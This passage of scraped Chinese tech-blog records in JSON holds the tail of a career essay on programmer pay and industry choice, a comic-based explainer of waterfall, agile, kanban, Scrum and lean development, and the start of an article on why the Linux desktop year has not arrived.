主动选择更大的平台，也就是跳槽了。但是跳槽也是有风险的，尤其是过了30岁的程序员。你在这家公司的收入高，是因为有之前的积累，换一家就没有积累了，等于从新人开始，而大多数的公司，5年经验的程序员就够用了。如果跳得不好，收入还可能越跳越低，如果还有老婆、孩子、房贷，那将面临更大的压力。所以当你想要从一个低的平台向更高的平台跳跃的时候，平时就要做足功夫，认真积累自己的实力。对于我来说，我缺乏大型项目的管理经验，但是没关系，我努力学习考一个PMP没什么问题吧？我缺乏大型软件的架构经验，但是没关系，我把.NET的基础知识和各种设计模式掰开了揉碎了没什么问题吧？我缺乏大型团队的管理经验，但是没关系，每次遇到管理方面的问题我都认真思考仔细总结没什么问题吧？有些人总是抱怨没有机会，运气不好，我想机会总是有的，但只属于有准备的人。</p>\n<h3>5.行业</h3>\n<p>我想说的最后一点就是行业。有时候你觉得已经万事俱备了，可是你所处的这个行业本身就属于极低利润率的，你再怎么努力也很难有很高的收入。很多情况下，可能公司也想提高你的待遇，但是由于缺乏利润的支撑，公司也是有心无力。所以，在选择公司，尤其是小公司的时候，要重点考察一下公司所处的行业如何？是不是前景比较好、利润比较高的行业？如果是大公司的话，这方面的问题就会少一些，因为如果方向有问题，它就无法做成大公司。</p>\n<p>行业是有周期性的，可能在一段时期内这个行业好，下一段时期这个行业就不行了。最典型的一个例子就是软盘，我现在的老板在成立这家公司之前是做销售的，他有一个客户，做索尼软盘的，这种软盘我想很多80后都见过。当时生意做得很大，可是当光盘出来以后，软盘的市场是会急剧萎缩的，可是这家公司的领导层居然没有看到，或者是看到了但不愿意转变，像鸵鸟一样在危机来临时把头埋在土里，继续做它的软盘。几年以后，这家公司就倒掉了。</p>\n<p>选择行业也不是选择暴利行业就一定好，比方说房地产。资本都是逐利的，当一个行业属于暴利，同时所有人都知道它是暴利的时候，危机就来了。这个危机就是会有大量的社会资源、人力物力投入到这个行业中企图分一杯羹。而全局上又没有一个统一的把控，这个行业究竟需要多少公司才是合适的？最后的结果就是过剩。就好像股票在崩盘时，也许跌到3000点是比较合理也比较正常的位置，但是由于人们的恐慌，它就跌到1600点了。</p>\n<p>感谢阅读，希望这篇文章能给你带来收获。</p>\n<p>不是所有一年工作经验的毕业生都有这样的待遇，我主要是看能力，而不是年龄、学历等。特别说明一下，以免误导。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"112809\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"112809votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"112809\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 9 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/3dec15374f3b9e62441c4d320c8998dd12c43dc8.jpg"}
{"url_object_id": "adfa75d1779c8eafc10e8cabe3bff3e9", "title": "客户想要的 vs 客户实际预算：漫画解读软件开发模式 ​​​​", "url": "http://blog.jobbole.com/113230/", "create_date": "2017/12/14", "front_img_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg6692mmwj20ig0bs4am.jpg"], "praise_nums": 10, "comment_nums": 6, "favor_nums": 9, "tags": "趣文小说,趣图", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>1913 年，美利坚工业之神——亨利福特，发明了世界上第一条流水线，汽车工业从此进入了大规模生产的时代。丰田公司提出的丰田生产系统（Toyota Production System）又为汽车工业带来了很多先进的生产和管理理念。</p>\n<p>先进的生产和管理理念是一个行业从小作坊走向规模化的必经之路，软件工业虽然诞生较晚，但是发展却非常迅速，这也同样得益于软件工业开发和管理理念的发展。这其中就从汽车工业吸收了很多成熟的理念。</p>\n<p>下面，就让我们通过这张出自 Toggle 的漫画，来了解软件开发模式的变迁史。</p>\n<h2>总览</h2>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fm603hue8aj20rs3duqn3.jpg\"></p>\n<p>这张图片从上向下，五个房间，分别是瀑布模型（waterfall），敏捷开发（agile），看板（KANBAN），SCRUM 和精益软件开发（lean）。</p>\n<p>除了瀑布模型这间小屋和其他小屋有着明显的界限之外，其他几种模型就像一个四合院，有着不可分割的关系，这也恰好表明，瀑布模式和敏捷开发模式是软件工业先后经历的两个阶段，而 KANBAN，SCRUM 和 LEAN 则是敏捷运动的产物。</p>\n<p>OK，客官里边请，让我们进第一个屋子看看。</p>\n<h2>Old Days——瀑布式软件开发</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/fa38bde05d5560efbfc865afcc0aa5a0.jpg\" alt=\"15128081424398\"></p>\n<p>所谓瀑布模型，就是说，软件开发是按照一定顺序展开的（传统线性生产流程 : Traditional,linear production flow）。就像汽车生产的流水线一样，每个部门各司其责，工作按照顺序展开，交付件单通道线性流动。你看这幅图，总体上就分为：<strong>需求 → 设计<strong> → </strong>制造<strong> → </strong>测试</strong>，四个阶段。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg664g0ndj208d06dgoo.jpg\" width=\"301\" height=\"229\"></p>\n<p>在这个系统中，客户被排除在生产系统之外（围墙是密闭不透明的），它们只能从需求的接口人那里向系统输入需求（Client places order）。正因如此，客户无法理解生产所需的费用以及为什么交付总是会延期，因此，也难免会闹出下面这样的笑话：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg662v0xcj207e0gyte6.jpg\" width=\"266\" height=\"610\"></p>\n<p>客户希望你造一辆汽车，却只愿意支付一辆自行车的开发成本。</p>\n<p>需求接纳后进入到设计阶段：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg6652zs5j20c707tgqa.jpg\" width=\"439\" height=\"281\"></p>\n<p>设计定型后，进入制造阶段：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg665nbgij20dn08t45d.jpg\" width=\"491\" height=\"317\"></p>\n<p>在线性的生产系统中，或者说在瀑布开发模式中，需求和设计是不可以进行修改的。工人被安排在制造系统中一个个工位上，每个人仅负责一个部件的生产和装配，就像这位盘腿坐着的“I know HTML”大哥一样，HTML 开发者只需要负责 HTML 的开发而无需，也不应该关心软件的其他部分。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66671jzj209d07r78i.jpg\" width=\"337\" height=\"279\"></p>\n<p>喂喂喂，这位老铁，不上班玩什么球啊？哎，您也别怪他，毕竟交付件（整车/软件）还没有完成开发，测试工作自然无法开展，当然得等着咯。这也是瀑布模型最大的弊端，下游工作的开展严格依赖于上游交付件的完成情况，这无疑是一种浪费，在争分夺秒的软件开发过程中，你能忍受这种浪费吗？</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg666trlkj208506777b.jpg\" width=\"293\" height=\"223\"></p>\n<p>汽车完成生产和测试之后，一次性交付到客户手中，完成客户的全部需求。</p>\n<h2>走进新时代——敏捷开发模式</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/d0d1ceb8da75fe97e9dff8706d6df0be.jpg\" alt=\"15128097291193\"></p>\n<blockquote><p>敏捷开发以用户的<strong>需求进化为</strong>核心，采用迭代、循序渐进的方法进行软件开发。在敏捷开发中，软件项目在构建初期被切分成多个子项目，各个子项目的成果都经过测试，具备可视、可集成和可运行使用的特征。换言之，就是把一个大项目分为多个相互联系，但也可独立运行的小项目，并分别完成，在此过程中软件一直处于可使用状态</p></blockquote>\n<p>有点书面是吧，其实很简单，敏捷开发的一个前提假设是：用户不可能在产品开发之前，设计之初就完整、明确的提出需求。期望用户在开发过程中不变更需求是不现实的。用户在开发前提出的需求，可能并不是它们最终希望得到的。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1flk6c8yl83j20k008qglx.jpg\" width=\"523\" height=\"228\"></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg667ckk9j20bt05zn1n.jpg\" width=\"425\" height=\"215\"></p>\n<p>在敏捷开发中，客户会参与到软件开发的整个流程中。整个开发过程不再是一堵不透风的墙，透明是关键（TRANSPARENCY IS KEY），但是，随着越来越多的用户参与进来，越来越多的问题也暴露出来了，越来越多不着调的需求也会被提出。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg667xsfij20dr08qn36.jpg\" width=\"495\" height=\"314\"></p>\n<p>敏捷开发的另一个重要概念就是<strong>迭代</strong>，所谓迭代，就是不断对产品进行细微的、渐进式的改进（Small incremental changes）。</p>\n<blockquote><p>“先给您上个小号的尾翼，用着好我再给您换个大的~”</p></blockquote>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg668ixufj20aa06ltc7.jpg\" width=\"370\" height=\"237\"></p>\n<p>在敏捷开发中，生产不再是线性的，开发的同时还会进行测试工作，所有人都在同时工作。尴尬等待的日子一去不复返咯~</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg6692mmwj20ig0bs4am.jpg\" width=\"664\" height=\"424\"></p>\n<p>利用敏捷模式开发出的产品，相较于传统的软件交付方式，一个显著的特点是能够及时响应客户需求的变更，不断适应新的趋势。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg669pb2lj20cc07a79q.jpg\" width=\"444\" height=\"262\"></p>\n<p>这不，隔壁老王喜当爹了，之前定的法拉利显得有点不稳重，宝宝也没地方坐。我们的产品经理和开发人员快速响应，轿跑变商务也不是什么大问题~~ 当然，为谁辛苦为谁忙，客户爸爸们一定要买单呀！</p>\n<p>什么？您问第一稿方案是什么样的？去翻垃圾桶吧！ <img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66aari0j208e04uq4v.jpg\" width=\"302\" height=\"174\"></p>\n<h2>一股来自东方的神秘力量——看板</h2>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66ayb9mj20fw0g9apk.jpg\" width=\"572\" height=\"585\"></p>\n<p>相信各位也注意到了，相对于瀑布模式的井井有条，敏捷开发在灵活的同时，也带来了一定程度的混乱。</p>\n<p>就在这个节骨眼上，还得请这位来自东方的神秘人物——丰田看板大师（KANBAN SENSEI）给你点拨点拨。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66bk590j206k07gdim.jpg\" width=\"236\" height=\"268\"></p>\n<p>KANBAN，不是汉语拼音，更不是英文缩写，它来自日语“看板”，カンバン的罗马拼写：Kanban。它正是丰田生产系统的一个重要概念：</p>\n<blockquote><p>看板管理，常作“Kanban管理”，是丰田生产模式中的重要概念，指为了达到及时生产（JIT）方式控制现场生产流程的工具。及时生产方式中的拉式（Pull）生产系统可以使信息的流程缩短，并配合定量、固定装货容器等方式，而使生产过程中的物料流动顺畅。</p></blockquote>\n<p>KANBAN要求把开发中的任务，以 TODO List 的方式表现出来：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66c3l9lj207c06itbl.jpg\" width=\"264\" height=\"234\"></p>\n<p>形式可以是即时贴，也可以是可视化软件等等。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg663dya7j20ds09h764.jpg\" width=\"496\" height=\"341\"></p>\n<p>在制造业中，看板也是非常重要的管理方法。也有将其称为目视化管理的。</p>\n<h2>SCRUM 又是什么？</h2>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66crh75j20m50fwx10.jpg\" width=\"690\" height=\"495\"></p>\n<blockquote><p>Scrum原始含义是指英式橄榄球次要犯规时在犯规地点对阵争球。争球双方各有8个队员参与，各方出3名前锋队员，并肩各站成一横排，面对面躬身互相顶肩，中间形成一条通道，其他队员分别站在后面，后排队员用肩顶住前锋队员的臀部，组成3、2、3或3、4、1阵形。然后，由犯规队的对方队员在对阵一侧1码外，用双手低手将球抛入通道，不得有利于本队。当球抛入通道时，前排的3对前锋队员互相抗挤，争相踢球给本方前卫或后卫队员，前卫和后卫队员必须等候前锋将球踢回后，方可移动</p></blockquote>\n<p><img class=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/259a008f1edf1a34a14e98f4e10e65dc.jpg\" alt=\"15128143307299\" width=\"463\" height=\"261\"></p>\n<p>在敏捷开发领域，SCRUM是一种迭代式增量软件开发过程，它包括了一些预定义的角色：</p>\n<ul>\n<li><strong>产品负责人 Product Owner</strong></li>\n</ul>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66db5hvj207i05w76o.jpg\" width=\"270\" height=\"212\"></p>\n<p>产品负责人负责维护订单</p>\n<ul>\n<li><strong>Scrum主管 Scrum Master </strong></li>\n</ul>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66dufcfj207s05kgo6.jpg\" width=\"280\" height=\"200\"></p>\n<p>SCURM Master 对整个SCRUM 过程负责，不惜一切代价（<em>AT ANY COST</em>），保证团队的工作时间和计划。</p>\n<ul>\n<li><strong>开发团队 Team </strong></li>\n</ul>\n<p>在 SCRUM 过程中，开发团队通常会进行冲刺 （Sprint），一个冲刺周期的长度通常是2-4周。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66e9phnj205x03qabg.jpg\" width=\"213\" height=\"134\"></p>\n<p>在这个冲刺过程中，开发小组专注于完成一组订单项的开发。比如：制造一个发动机 <img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmg66esfh8j209c05u77y.jpg\" width=\"336\" height=\"210\"></p>\n<p>对于KANBAN 和 SCRUM，有人说 KANBAN vs SCRUM，也有人说 KANBAN+SCRUM，究竟谁是谁非，我看只有适合自己团队的才是最好的，毕竟方法和流程是为业务服务的。就这篇漫画来看，SCRUM + KANBAN 是两个避免混乱的好方法。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66f9q2mj205o08a40g.jpg\" width=\"204\" height=\"298\"></p>\n<p><em>来来来，兄弟们，我们来开一个关于减少站会的站会~~</em></p>\n<h2>精益软件开发</h2>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6dd2911f0156068e997abd790e0f7493.jpg\" alt=\"15128322280368\"></p>\n<p>第二次世界大战结束后，丰田公司前社长丰田英二曾经去美国汽车城底特律对福特生产线进行了考察，尽管福特高效的大规模生产线给他造成了很大的冲击，丰田英二还是非常理智的认识到了当时日本制造业所面临的困难。经济萧条，资源短缺，小批量差异化的需求使他不能盲目的引进这种大规模的生产方式，随后丰田公司发明并实践了一系列的管理和生产方法，这些方法在后来被统称为精益生产和管理方式（lean）</p>\n<p>精益生产的思想， 简单来说就是Just In Time（JIT），也就是说，只在必要的时候，按照需求的量，仅生产必要的产品，杜绝浪费。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66ftyjjj206b03r3zb.jpg\" width=\"227\" height=\"135\"></p>\n<blockquote><p>Eric Ries曾在《精益创业实战》中提出MVP（minimum viable product）概念，意即“最简可行产品”——用最快、最简明的方式建立一个可用的产品原型，这个原型要表达出你产品最终想要的效果，然后通过迭代来完善细节。</p></blockquote>\n<p>精益软件开发不再像传统的软件开发一样，耗时几年才向客户交付完整的软件。取而代之的是，优先建立一个最简可用的原型产品投放市场或交付到客户手中。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg66geocdj209h0biq8i.jpg\" width=\"341\" height=\"414\"></p>\n<p>一辆最简可用的汽车是什么样子的呢？不就是四个轮子、一个方向盘、一个座椅然后一起装在底盘上么。能开、能停、能转弯不就是汽车嘛。让客户先享受到产品带来的收益是最重要的。</p>\n<p><img src=\"https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1512898589423&amp;di=158b96821c3e271a06d229192b48d81f&amp;imgtype=0&amp;src=http%3A%2F%2Fa1.att.hudong.com%2F05%2F95%2F01300000432220148643955825350_s.jpg\" alt=\"\"></p>\n<p><strong>BUT!!!</strong></p>\n<p>你看，这里还有一位失落的大叔</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fmg66h14y4j20b706877s.jpg\" width=\"403\" height=\"224\"></p>\n<p>尽管MPV 的概念听上去是如此的简单，可是实施起来却没有那么容易。</p>\n<blockquote><p>因为在设计产品原型的过程中，很多设计师是这么做的：把他们认为的产品应当具备的功能罗列出来，然后一一排除，排定优先级，决定哪个功能要在最初的版本中出现，而哪个可以靠后一些。但设计师们往往无法真的只把最必要的功能留在初级版本中——因为诱惑太多。设计师们总希望把很cool、很有惊喜的小细节带给用户来博取赞叹，但从全局来看，其实把某些功能刻意强加进产品，是会削弱产品整体流畅性的。Mr Jamie曾在其博客中把这种心理表现称作<strong>“艺术家心结”</strong>。</p></blockquote>\n<p>所有不必的东西（ALL NON-ESSENTIALS ARE THROWN OUT）都不能应用到当前的最小可用产品。你说，艺术家们得多伤心啊（愁的胡子都长一脸了）</p>\n<p>此外，尽早交付产品给客户或部署到生产环境，也促进了 DevOps，持续集成（CI），生产环境测试（testing in production）等实践的发展。尽早交付产品，尽早从用户获取反馈，不论是好的还是坏的，促使问题尽早暴露，尽早修复，持续集成，持续改进。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmg68pf1nbj209208wgps.jpg\" width=\"326\" height=\"320\"></p>\n<p>眼尖的童鞋，估计早就看到了桌子上有一只程序员的好朋友 —— 小黄鸭。你还不知道小黄鸭？那你该看看这篇文章：《<a href=\"http://blog.jobbole.com/85719/\" target=\"_blank\">小黄鸭调试法，每个程序员都要知道的</a>》。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmg663ygd2j206n047ta2.jpg\" width=\"239\" height=\"151\"></p>\n<h2>结束语</h2>\n<p>实际工作中的软件开发和管理模式，往往并不能纯粹的归类于以上某种类型。即使是相同的开发模型，在不同的团队中也往往会根据实际情况进行变化和改进，留言告诉我们你所在的公司是如何进行软件开发的吧~</p>\n<p>此外，如果你对我的解析有不同的看法，或者你在图中看出了新的内涵，也欢迎在评论中互动！</p>\n<h3>扩展阅读</h3>\n<ul>\n<li>[1] <a href=\"http://www.agileweboperations.com/scrum-vs-kanban\">kanban vs scrum vs agile</a></li>\n<li>[2] <a href=\"http://www.jianshu.com/p/e44b1038c9cf\">Scrum vs. 看板，还是Scrum + 看板？ </a></li>\n<li>[3] <a href=\"https://msdn.microsoft.com/zh-cn/library/hh533841(v=vs.110).aspx\">精益软件开发</a></li>\n<li>[4] <a href=\"https://www.ibm.com/developerworks/cn/rational/leaner-software-development-with-the-aid-of-collaborative-lifecycle-management/\">使用 DevOps 进行精益软件开发</a></li>\n<li>[5]<a href=\"https://baike.baidu.com/item/%E4%B8%B0%E7%94%B0%E5%BC%8F%E7%94%9F%E4%BA%A7%E7%AE%A1%E7%90%86/511862?fr=aladdin&amp;fromid=10166317&amp;fromtitle=%E4%B8%B0%E7%94%B0%E7%94%9F%E4%BA%A7%E7%B3%BB%E7%BB%9F\"> 丰田生产系统</a></li>\n</ul>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/05/d3704dca07a3c6ce19c14a9762a0d776.jpg\">\n            \n                            <img src=\"http://www.jobbole.com/wp-content/uploads/2016/03/d8aa159efcd108a908cd3d6ab74b8f5f.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113230\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113230votetotal\">10</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113230\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 9 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 6 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/10/bb74ca97c7e8b5a21a24f0b5bbc519c3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            翻译组的勤务员（联系此人请微博私信或hanxiaomax@qq.com        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/hanxiaomax\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/hanxiaomax/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/hanxiaomax/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 95</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://hanxiaomax.github.io\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://www.weibo.com/smilingly1989\"><i class=\"fa fa-weibo\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/hanxiaomax\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/ddea7e492385a85fd588582693b753dfb4e75192.jpg"}
{"url_object_id": "4f72efb5ca5c32be1a85f919cb1f083c", "title": "说了这么久的“Linux 桌面年”，为什么还没来？", "url": "http://blog.jobbole.com/113361/", "create_date": "2017/12/22", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/08/2e327580770370cc02c696e176d4cb77.jpg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://oschina.net/news/91721/year-of-the-linux-desktop\">开源中国</a>   </div><p>有许多关于Linux经久不衰的话题，“Linux桌面年”就是其中之一。</p>\n<p>你一定会听过这样的预言：“这将是Linux走向桌面的一年。”事实上，这样的预言我们不止听过一次，2012 年，2008 年，甚至是更早是时间，几乎每一年我们都听到过这样的“预言”。那么，说了这么久的“ Linux 桌面年”，它到底来了吗？</p>\n<p>2017 年的确发生了一些事件，让 Linux 看起来以往有所不同。</p>\n<p><strong>11 月入围世界 Top 500 的超级计算机都在运行 Linux</strong></p>\n<p>在今年 11 月公布的世界超级计算机排行榜中，Top 500 的计算机都在运行 Linux。Linux 首次被 Top 500 的超级计算机使用是在 1998 年，当时的超算还是由 Unix 操作系统统治。然而从 2003 年起，超算开始被 Linux 系统支配，至 2004 年，Linux 已经在超算中占据主导地位。</p>\n<p>当时专家将 Linux 入榜的主要原因总结如下：</p>\n<ul>\n<li>世界上最顶级的超算都是作为特定研究机器构建，因此每台机器都是一个独立项目，具有独特的特性和优化要求。</li>\n<li>为节省成本，没有人愿意为一台计算开发一个定制的操作系统。</li>\n<li>而使用 Linux，研究团队可以按照设计需求，轻松对 Linux 的源码进行修改和优化，因此可以节省大量成本。</li>\n</ul>\n<p><strong>2017 Linux Kernel 开发报告称：Linux 在统治着计算机世界</strong></p>\n<p>就在不久前，知名外媒ZDNet 公布了一份 Linux 基金会的调查报告，报告显示，Linux 运行着 90% 的公共云工作量，世界上 82% 的智能手机，62% 的嵌入式市场，以及几乎占领了 99% 的超级计算机市场。所有的这些都基于 Linux 内核。</p>\n<p>自2005年以来，Linux Kernel 采用 Git 版本控制系统，来自 1,400 多家公司的 15,637 名开发者为 Linux 内核做出了贡献。去年以来，来自 500 多家公司的 4300 多名开发者对内核做出了贡献。其中 1,670 个是首次贡献，约占贡献者的三分之一。</p>\n<p>去年，Linux 内核的十大企业贡献者包括 Intel, Red Hat, Linaro, IBM, Samsung, SUSE, Google, AMD, Renesas 和 Mellanox。微软也仍在贡献，但不再是最大的贡献者。</p>\n<p>Linux 内核开发者和 LWN.net 的编辑 Jonathan Corbet 以及稳定的 Linux 内核维护者 Greg Kroah-Hartman 说到：</p>\n<p>Linux 内核是迄今为止最大和最成功的开源项目之一，巨大的变革率和个人贡献者人数显示，它拥有一个充满活力和活跃的社区，参与其中的开发着和公司的数量也在增加；到目前为止，开发过程已经证明是能够无障碍地扩展到更高的速度。</p>\n<p><strong>Linus 在大会上表示：Linux 依然让他惊讶</strong></p>\n<p>今年，Linus Torvalds 首次出席了在中国举行的 LinuxCon + ContainerCon + CloudOpen China 会议，谈论了 Linux 诞生二十五年来仍然让他感到惊讶和激励他的事情。</p>\n<p>Linus 说，“令我感到有意思的是，我认为已经稳定的代码仍然在持续得到改进；有些代码我们已经很多年没有接触，然后有人现身提出了改进，或者针对我认为没人使用的代码递交了 bug 报告。</p>\n<p>Linus 称，他们的工作流程能持续更长时间，Linux 仍然有强有力的维护者团队，当维护者变老变胖，会有新人来接替。他不认为需要担心未来二十年。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/033852ef05e89dc6e98dd4c4b70f6d23.jpeg\" alt=\"\"></p>\n<p>还有 Linux 的忠实用户发表博客，表达了对 Linux 的支持与热爱。作者在文中表示，Linux 具有高安全、高可用、易于维护、开源等优秀特点，深得人们喜爱。内容详情请看：十点总结，为何 Linux 如此深得人心</p>\n<p>在2017年，Linux 在一定程度上取得了不小的进步，但这些似乎并不足以推动“Linux 桌面年”的到来。</p>\n<p><strong>为什么“Linux 桌面年”还没来？</strong></p>\n<p>近日，红帽高级软件工程经理、GNOME / Fedora 的开发者 Christian Schaller ，还就“Linux 桌面年”失约多年的事在其博客上分享了他的观点。</p>\n<p>Christian 在文中列出了数个他认为影响 Linux 桌面发展的因素，大致总结后，包括：</p>\n<ul>\n<li>Linux 桌面分发版本太多，市场太过碎片化；</li>\n<li>早年严重缺乏应用支持，常用软件和字体支持不足。现在已改善了许多；</li>\n<li>缺乏 API 和 ABI 稳定性；</li>\n<li>受 MacOSX 冲击；</li>\n<li>Linux 桌面发展前 10 年，微软在某种程度上将 Linux 作为竞争对手，并成功打压；</li>\n<li>获取盗版 Windows 相对简单，有了“免费”的操作系统后没有需求使用 Linux （主要指向中国o(□)o ）；</li>\n<li>以 Linux 